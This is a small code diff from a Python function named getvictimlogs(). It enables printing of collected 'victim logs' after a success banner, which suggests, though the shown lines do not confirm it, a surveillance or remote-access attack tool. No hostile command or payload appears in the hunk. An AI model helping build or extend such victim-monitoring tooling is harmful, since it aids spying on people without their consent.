@@ -44,7 +44,7 @@ def getvictimlogs():
     
     print(Fore.GREEN  + Style.BRIGHT + "---------Victim Logs Saved Successfully----------")
     print(" ")
-    #print(logs)
+    print(logs)
     print("")
     print(Fore.MAGENTA + "----------------------------------------------------")
     print("")     
